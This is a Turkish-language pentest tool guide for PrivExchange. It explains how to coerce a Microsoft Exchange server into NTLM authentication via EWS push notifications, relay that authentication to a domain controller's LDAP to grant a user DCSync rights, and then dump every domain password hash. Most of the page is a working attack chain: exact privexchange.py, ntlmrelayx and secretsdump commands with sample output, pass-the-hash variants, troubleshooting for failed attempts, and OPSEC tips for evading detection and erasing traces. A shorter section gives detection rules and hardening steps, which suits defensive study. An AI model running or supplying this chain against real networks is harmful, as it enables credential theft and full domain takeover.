# PrivExchange

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Microsoft Exchange Web Services (EWS) SOAP bildirimlerini suistimal ederek Exchange sunucusunu saldırganın HTTP dinleyicisine NTLM doğrulaması yapmaya zorlayan ve LDAP relay üzerinden sıradan bir kullanıcıya DCSync yetkisi kazandıran Python sömürü aracı.

---

## 1. Genel Bakış ve Amaç

**PrivExchange** (Dirk-jan Mollema / Fox-IT tarafından keşfedilen ve geliştirilen), Active Directory ve Microsoft Exchange Server mimarilerindeki iki kritik tasarım zafiyetini bir araya getirerek sıradan bir e-posta kullanıcısından doğrudan **Domain Admin** yetkisine sıçranmasını sağlayan devrim niteliğinde bir sömürü aracıdır (CVE-2019-0686 / CVE-2019-0724).

Zafiyet zinciri şu iki temel gerçeğe dayanır:
1. **Exchange'in Aşırı Yetkileri:** Active Directory'de Microsoft Exchange kurulduğunda oluşturulan `Exchange Windows Permissions` ve `Exchange Trusted Subsystem` grupları, tarihsel olarak etki alanı kök nesnesi (`DC=domain,DC=local`) üzerinde **WriteDacl** (Erişim Denetim Listesi yazma) yetkisine sahiptir. Bu yetki, etki alanı üzerindeki herhangi bir kullanıcıya DCSync (`DS-Replication-Get-Changes-All`) hakkı tanımlamaya yeterlidir.
2. **EWS PushSubscription Koersiyonu:** Exchange Web Services (EWS), istemcilerin gelen yeni postaları dinleyebilmesi için bir SOAP bildirim mekanizması (`PushNotification`) sunar. Standart bir posta kutusuna sahip herhangi bir kullanıcı, EWS'e "Yeni bir olay olduğunda şu URL'ye bildirim gönder" diyerek saldırganın kontrolündeki bir HTTP dinleyicisini (`http://attacker_ip:8080/notification`) hedef gösterebilir.

Exchange sunucusu bildirimi göndermek için derhal kendi makine hesabı (**NT AUTHORITY\SYSTEM** context'inde `EXCHANGE01$`) ile saldırganın HTTP dinleyicisine bağlanır. Saldırgan `HTTP 401 Unauthorized` başlığı ile NTLM Challenge gönderdiğinde Exchange sunucusu NTLM Response ile kimliğini doğrular.

Saldırgan bu isteği `ntlmrelayx` üzerinden Domain Controller'ın **LDAP** servisine relay eder. Exchange makine hesabının etki alanı kökünde `WriteDacl` hakkı olduğu için `ntlmrelayx`, saldırganın standart kullanıcısına doğrudan **DCSync yetkisi** enjekte eder!

```
       [ Saldırgan: PrivExchange ]
                     |
     1. SOAP PushSubscription İsteği (Port 443 HTTPS):
        "Beni http://192.168.1.50:8080/test adresinden bilgilendir!"
                     |
                     v
       [ Microsoft Exchange Server ]
                     |
     2. EXCHANGE01$ Makine Hesabı Saldırgana HTTP Bağlantısı Açar:
        http://192.168.1.50:8080/test
                     |
                     v
     ================================================ Ağ (HTTP)
                     |
                     v
         [ Dinleyici: ntlmrelayx ] (Port 8080)
                     |
     3. NTLMv2 Kimliği DC LDAP Servisine Relay Eder (Port 389)
                     |
                     v
         [ Domain Controller (LDAP) ]
                     |
     4. WriteDacl Yetkisi Kullanılarak Saldırgan Kullanıcısına
        DCSync (DS-Replication-Get-Changes-All) Hakkı Yazıldı!
                     |
                     v
       [ Saldırgan ] ===> secretsdump.py ile Tüm Etki Alanı Şifreleri Çekildi!
```

### Neden Önemli?
- **Sıfırdan Domain Admin:** Yalnızca bir e-posta adresi ve parolası olan sıradan bir çalışan hesabıyla hiçbir yerel yönetici hakkı gerekmeden etki alanının tüm şifreleri elde edilebilir.
- **Protokol Değişimi (Cross-Protocol Relay):** HTTP üzerinden gelen kimlik doğrulamasının LDAP protokolüne relay edilmesinin en etkili ve somut örneğidir.
- **Zorlamalı Kimliğin Zirvesi:** Webhook ve SOAP mimarilerinin kimlik doğrulama zorlamasında nasıl bir silaha dönüşebileceğini kanıtlamıştır.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | PrivExchange | PetitPotam | Ruler |
|---|---|---|---|
| **Hedef Sunucu** | Microsoft Exchange Server | Domain Controller / Sunucular | Exchange Mailbox (İstemci) |
| **Kullandığı Protokol** | EWS SOAP (HTTPS Port 443) | MS-EFSR (SMB Port 445) | MAPI / RPC / HTTP |
| **Gereken Hak** | Standart E-Posta Kutusu | Standart Kullanıcı / Anonim | Kullanıcı Parolası |
| **Sonuç** | Doğrudan DCSync Yetkisi | DC TGT / Sertifika | Kod Çalıştırma / Kural Ekleme |
| **Relay Hedefi** | DC LDAP (TCP 389) | AD CS HTTP / LDAP | Relay Yok |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

PrivExchange Python tabanlı hafif bir script olarak çalıştırılır.

```bash
python3 privexchange.py -ah <Saldırgan_IP> -u <Kullanıcı> -p <Parola> -d <Etki_Alanı> <Exchange_Sunucusu> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `<Exchange_Sunucusu>` | Hedef Exchange sunucusunun FQDN veya IP adresi (Zorunlu). | `mail.lab.local`, `192.168.1.20` |
| `-ah, --attacker-host` | Exchange'in HTTP bağlantısı açacağı saldırgan dinleyici IP'si (Zorunlu). | `-ah 192.168.1.50` |
| `-ap, --attacker-port` | Saldırganın HTTP dinleyici portu (Varsayılan: 80 / ntlmrelayx için 8080). | `-ap 8080` |
| `-u, --user` | Exchange üzerinde posta kutusu bulunan standart kullanıcı adı. | `-u mehmet` |
| `-p, --password` | Kullanıcının parolası. | `-p Parola123!` |
| `-d, --domain` | Hedef Active Directory etki alanı adı. | `-d lab.local` |
| `-hashes` | Parola yerine LM:NTLM hash ile kimlik doğrulama. | `-hashes :e19ccf...` |
| `-s, --ssl` | Exchange EWS bağlantısını HTTPS (TCP 443) üzerinden zorlar (Varsayılan). | `-s` |
| `--no-ssl` | Exchange EWS bağlantısını şifresiz HTTP (TCP 80) üzerinden yapar. | `--no-ssl` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: PrivExchange ve ntlmrelayx ile Standart Kullanıcıya DCSync Hakkı Tanımlama

Etki alanında posta kutusu olan `ahmet` kullanıcısı ile tam etki alanı yetkisi kazanma zinciri.

```bash
# Adım 1: Kali makinesinde ntlmrelayx dinleyicisini LDAP ve DCSync modunda başlat
sudo impacket-ntlmrelayx -t ldap://192.168.1.10 --escalate-user ahmet -smb2support
```
```bash
# Adım 2: PrivExchange ile Exchange sunucusunu ntlmrelayx'e bağlat
python3 privexchange.py -ah 192.168.1.50 -ap 80 -u ahmet -p 'Sifre123!' -d lab.local mail.lab.local
```

```text
[*] Checking Exchange Web Services URL...
[*] Successfully authenticated with user ahmet
[*] Sending SOAP PushNotification request...
[+] Exchange accepted subscription request!
[+] Exchange will contact http://192.168.1.50:80/ in a few seconds!
```
```text
[ntlmrelayx Konsolu]
[*] HTTP Client connected from 192.168.1.20 (EXCHANGE01$)
[*] Relaying authentication for LAB\EXCHANGE01$ to ldap://192.168.1.10
[*] Authenticating against ldap://192.168.1.10 as LAB\EXCHANGE01$ SUCCEED
[*] Modifying DACL for Domain Root (DC=lab,DC=local)...
[+] Successfully added DCSync rights for user ahmet!
```
*Analiz:* Exchange makine hesabı (`EXCHANGE01$`) saldırganın dinleyicisine bağlandı; ntlmrelayx bu kimliği DC LDAP'a relay ederek `ahmet` kullanıcısına `DS-Replication-Get-Changes-All` hakkını ekledi.

---

### Senaryo 2: Elde Edilen DCSync Hakkı ile Tüm Parola Hash'lerini Dökme (secretsdump)

`ahmet` kullanıcısı artık bir etki alanı yöneticisi gibi davranarak `krbtgt` dahil tüm hash'leri uzaktan dökebilir:

```bash
secretsdump.py lab.local/ahmet:Sifre123!@192.168.1.10 -just-dc-ntlm
```

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:55b3d0a1b2c3d4e5f6a7b8c9d0e1f2a3:::
[+] Finished dumping NTDS.dit! Domain compromised!
```
*Analiz:* Bir dakikadan kısa sürede sıradan bir e-posta hesabından tüm etki alanının parola veritabanı (NTDS.dit) ele geçirildi.

---

### Senaryo 3: Pass-the-Hash ile NTLM Hash Kullanarak EWS Tetikleme

Açık metin parola olmadan NTLM hash ile SOAP çağrısı yapma.

```bash
python3 privexchange.py -ah 192.168.1.50 -ap 80 -u operator -hashes :e19ccf750c72545f1b5f1b2b80429f08 -d lab.local mail.lab.local
```

---

### Senaryo 4: Alternatif Port ile ntlmrelayx'e Yönlendirme (-ap 8080)

Eğer saldırgan makinede port 80 başka bir servis tarafından işgal edilmişse özel port kullanımı.

```bash
# ntlmrelayx özel portta dinler
sudo impacket-ntlmrelayx -t ldap://192.168.1.10 --escalate-user ahmet -smb2support

# PrivExchange ile port 8080 hedeflenir
python3 privexchange.py -ah 192.168.1.50 -ap 8080 -u ahmet -p 'Sifre123!' -d lab.local mail.lab.local
```

---

### Senaryo 5: Exchange EWS URL'sinin Erişilebilirliğini Doğrulama (curl Ön Denetimi)

Saldırı öncesinde Exchange sunucusunun EWS uç noktasının açık olup olmadığını kontrol etme.

```bash
curl -k -u "lab.local\ahmet:Sifre123!" https://mail.lab.local/EWS/Exchange.asmx
```
*Analiz:* HTTP 200 veya SOAP şeması yanıtı dönüyorsa EWS servisi hazırdır.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Exchange returned 401 Unauthorized` | Girilen kullanıcı adı, parola veya etki alanı adı hatalıdır ya da kullanıcının posta kutusu aktif değildir. | Kimlik bilgilerini ve posta kutusunun varlığını OWA (`https://mail/owa`) üzerinden doğrulayın. |
| `ntlmrelayx: Attack failed: Server requires signing (LDAP Signing)` | Hedef Domain Controller'da LDAP imzalama zorunlu kılınmıştır (`LDAPServerIntegrity = 2`). | LDAP yerine LDAPS (`ldaps://192.168.1.10`) hedefleyin veya Channel Binding kapalıysa SSL üzerinden deneyin. |
| `Exchange accepted subscription but never contacted attacker host` | 1. Exchange sunucusundan saldırgan makinesine giden HTTP trafiği güvenlik duvarı tarafından engellenmektedir.<br>2. Saldırgan IP'si Exchange tarafından yönlendirilememektedir. | Exchange ile aynı alt ağda veya erişilebilir bir IP'de dinleyici açın; host firewall ayarlarını kontrol edin. |
| `ntlmrelayx: Failed to modify DACL: Insufficient access rights` | Microsoft'un KB4490159 / CVE-2019-0686 yaması uygulanmış ve `Exchange Windows Permissions` grubundan `WriteDacl` yetkisi kaldırılmıştır. | Sistem yamalanmıştır; saldırgan DCSync ekleyemez. Ancak Exchange makine hesabı RBCD veya AD CS relay için hala kullanılabilir. |
| `SSL: CERTIFICATE_VERIFY_FAILED` | Exchange sunucusu kendinden imzalı (self-signed) SSL sertifikası kullanmaktadır. | PrivExchange varsayılan olarak sertifika doğrulamasını atlar; komut satırında FQDN yerine IP adresi deneyin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Domain Controller Event ID 5136 (A directory service object was modified):**
  - **Kritik SIEM İmzası:** Etki alanı kök nesnesinin (`DC=lab,DC=local`) `nTSecurityDescriptor` özniteliğine yeni bir ACE eklenmesi (DCSync hakları).
- **Exchange Server IIS Logları:**
  - `POST /EWS/Exchange.asmx` - Status 200.
  - User-Agent: Python-requests veya standart istemci başlığı.
- **Windows Security Event ID 4624 (Logon):**
  - Logon Type `3` (Network Logon).
  - Exchange makine hesabının (`EXCHANGE01$`) DC'ye LDAP üzerinden bağlanması.

### 5.2 Ağ ve EDR İmzaları
- **Exchange Sunucusundan Dışarıya Anormal HTTP Bağlantısı:** Bir Exchange sunucusunun bir iş istasyonuna veya yabancı bir IP'ye `POST /` isteği göndermesi EDR ve NDR sistemlerinde doğrudan anomali olarak işaretlenir.
- **DCSync ACE Değişikliği:** Etki alanı köküne `DS-Replication-Get-Changes-All` hakkının çalışma saatleri dışında ve standart bir kullanıcı için eklenmesi SOC ekiplerini anında alarma geçirir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1187** | Forced Authentication | EWS SOAP PushSubscription ile Exchange'i kimlik doğrulamaya zorlama. |
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS and SMB/HTTP Relay | Exchange kimliğini DC LDAP servisine relay etme. |
| **T1098** | Account Manipulation | Standart kullanıcıya DCSync ACE izni ekleme. |
| **T1003.006** | OS Credential Dumping: DCSync | Eklenen yetki ile NTDS.dit parola dökümü alma. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **Kalıcı ACL İzi:** Eklenen DCSync hakkı etki alanı denetiminde kalıcı olarak görünür. | Test tamamlandıktan hemen sonra `nxc ldap` veya PowerView ile eklenen ACE'yi etki alanı kökünden temizleyin! |
| **Gereksiz EWS İstekleri:** Birden fazla başarısız SOAP çağrısı IIS loglarında şüphe çeker. | Öncesinde kimlik doğruluğunu OWA üzerinden tek istekte doğrulayın. |
| **HTTP Dinleyici İmzası:** Standart Python HTTP sunucusu yerine Nginx veya meşru bir User-Agent kullanın. | ntlmrelayx arkasındaki dinleyiciyi özelleştirin. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (KQL — Microsoft Sentinel / Defender for Identity)
```kql
// Etki Alanı Kökünde DACL Değişikliği ve DCSync Hakkı Eklenmesi Tespiti
IdentityDirectoryEvents
| where ActionType == "DirectoryServiceAccess" or ActionType == "DirectoryServiceChanges"
| where AdditionalFields has "DS-Replication-Get-Changes-All" or AdditionalFields has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
| project Timestamp, TargetAccountDisplayName, InitiatingProcessAccountName, IPAddress
| order by Timestamp desc
```

#### Tespit Kuralı (Sigma — Exchange EWS Şüpheli PushSubscription)
```yaml
title: Suspicious Exchange EWS PushSubscription Request
status: high
logsource:
    service: w3c
    product: windows
detection:
    selection:
        cs-method: 'POST'
        cs-uri-stem|startswith: '/EWS/Exchange.asmx'
        sc-status: 200
    condition: selection
level: medium
```

#### Sertleştirme ve Önleme Adımları
1. **Microsoft Güvenlik Yaması (KB4490159 / CVE-2019-0686):** Exchange sunucularındaki en son CU güncellemeleri uygulanmalı; `Exchange Windows Permissions` grubunun etki alanı kökü üzerindeki `WriteDacl` hakkı kaldırılmalıdır.
2. **LDAP İmzalama ve Channel Binding:** Domain Controller'larda LDAP Signing (`LDAPServerIntegrity = 2`) ve LDAPS üzerinde Channel Binding zorunlu kılınmalıdır.
3. **EWS Throttling ve PushSubscription Kısıtlaması:** Exchange yönetim konsolundan PushSubscription mekanizması genel kullanıma kapatılmalı veya yalnızca güvenilen IP'lerle sınırlandırılmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Standart PrivExchange çalıştırma (En yaygın kullanım)
python3 privexchange.py -ah 192.168.1.50 -ap 80 -u ahmet -p Sifre123 -d sirket.local mail.sirket.local
```
- **Ne Yapar?:** Exchange sunucusunu `192.168.1.50:80` dinleyicisine NTLM doğrulaması yapmaya zorlar.
- **Ne Zaman Kullanılır?:** Sıradan bir posta kutusu hesabı üzerinden DCSync yetkisi kazanmak için.
- **Parametreler:** `-ah`: Saldırgan IP; `-ap`: Dinleyici portu; `-u/-p/-d`: E-posta kimliği.

```bash
# 2. ntlmrelayx ile LDAP DCSync yetki yükseltme dinleyicisi
sudo impacket-ntlmrelayx -t ldap://192.168.1.10 --escalate-user ahmet -smb2support
```
- **Ne Yapar?:** Exchange'den gelen HTTP NTLM kimliğini DC LDAP'a ileterek `ahmet` kullanıcısına DCSync hakkı verir.
- **Ne Zaman Kullanılır?:** PrivExchange komutunu ateşlemeden hemen önce arka planda başlatılır.
- **Parametreler:** `--escalate-user ahmet`: Yetkilendirilecek kullanıcı.

```bash
# 3. Pass-the-Hash ile NTLM hash kullanarak çalıştırma
python3 privexchange.py -ah 192.168.1.50 -ap 80 -u operator -hashes :e19ccf750c72545f1b5f1b2b80429f08 -d sirket.local mail.sirket.local
```
- **Ne Yapar?:** Parola bilmeden NTLM hash ile Exchange EWS servisine bağlanır ve tetikler.
- **Ne Zaman Kullanılır?:** Bellekten yalnızca hash elde edildiğinde.
- **Parametreler:** `-hashes`: NTLM hash formatı.

```bash
# 4. Kazanılan yetki ile secretsdump çalıştırma (DCSync)
secretsdump.py sirket.local/ahmet:Sifre123@192.168.1.10 -just-dc-ntlm
```
- **Ne Yapar?:** Eklenen DCSync hakkı ile etki alanının tüm parola hash'lerini uzaktan çeker.
- **Ne Zaman Kullanılır?:** ntlmrelayx işlemi başarıyla tamamlandıktan hemen sonra.
- **Parametreler:** `-just-dc-ntlm`: NTDS.dit NTLM hash dökümü.

```bash
# 5. Özel port üzerinden dinleyiciye yönlendirme (-ap 8080)
python3 privexchange.py -ah 192.168.1.50 -ap 8080 -u ahmet -p Sifre123 -d sirket.local mail.sirket.local
```
- **Ne Yapar?:** Exchange sunucusunu 8080 portundaki ntlmrelayx'e yönlendirir.
- **Ne Zaman Kullanılır?:** Port 80 başka servislerce kullanıldığında.
- **Parametreler:** `-ap 8080`: Dinleyici portu.

```bash
# 6. EWS servisini şifresiz HTTP üzerinden zorlama (--no-ssl)
python3 privexchange.py -ah 192.168.1.50 -ap 80 -u ahmet -p Sifre123 -d sirket.local --no-ssl mail.sirket.local
```
- **Ne Yapar?:** Exchange EWS çağrısını HTTPS yerine port 80 HTTP üzerinden yapar.
- **Ne Zaman Kullanılır?:** Exchange SSL sertifikası geçersiz veya bozuk olduğunda.
- **Parametreler:** `--no-ssl`.

```bash
# 7. SOCKS proxy modu ile Exchange makine oturumunu saklama
sudo impacket-ntlmrelayx -t ldap://192.168.1.10 -smb2support -socks
```
- **Ne Yapar?:** Exchange makine kimliğini relay edip SOCKS tünelinde saklar.
- **Ne Zaman Kullanılır?:** Doğrudan DCSync yerine LDAP üzerinden başka nesneleri manipüle etmek için.
- **Parametreler:** `-socks`: SOCKS proxy başlat.

```bash
# 8. Exchange EWS bağlantı kontrolü (curl)
curl -k -u "sirket.local\ahmet:Sifre123" https://mail.sirket.local/EWS/Exchange.asmx
```
- **Ne Yapar?:** EWS SOAP uç noktasının kimlik doğrulama isteyip istemediğini denetler.
- **Ne Zaman Kullanılır?:** PrivExchange çalıştırmadan önce ön hazırlık olarak.
- **Parametreler:** `-k`: SSL doğrulamayı atla; `-u`: Kullanıcı kimliği.

```bash
# 9. AD CS Sertifika servisine relay zinciri (Alternatif)
sudo impacket-ntlmrelayx -t http://ca.sirket.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```
- **Ne Yapar?:** Exchange makine kimliğini AD CS'e relay ederek Exchange sunucu sertifikası alır.
- **Ne Zaman Kullanılır?:** DC'de LDAP Signing zorunlu olduğunda alternatif yetki yükseltme yolu olarak.
- **Parametreler:** `--adcs`: AD CS modu.

```powershell
# 10. Etki alanı kökündeki DCSync hakkını operasyon sonrası temizleme
$root = [ADSI]"LDAP://DC=sirket,DC=local"
# ACE kaldırma scripti ile ahmet kullanıcısının hakları geri alınır
```
- **Ne Yapar?:** Eklenen DCSync izinlerini temizleyerek adli bilişim (IR) izlerini yok eder.
- **Ne Zaman Kullanılır?:** Sızma testi raporlama ve temizlik (cleanup) aşamasında.
- **Parametreler:** PowerShell ADSI erişimi.

---

## Kaynaklar

- **Resmi GitHub Deposu (PrivExchange):** [https://github.com/dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)
- **Fox-IT Blog — Beyond Evil: From any user to Domain Admin using Exchange:** [https://blog.fox-it.com/](https://blog.fox-it.com/)
- **Microsoft Güvenlik Güncellemesi (CVE-2019-0686 / ADV190007):** [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0686](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0686)

---

> **Önceki:** [← Dementor](./Dementor.md) · **Sonraki Kategori:** [5. NTLM ve Kerberos Relay Motorları →](../Kategori_05_NTLM_ve_Kerberos_Relay_Motorlari/README.md)
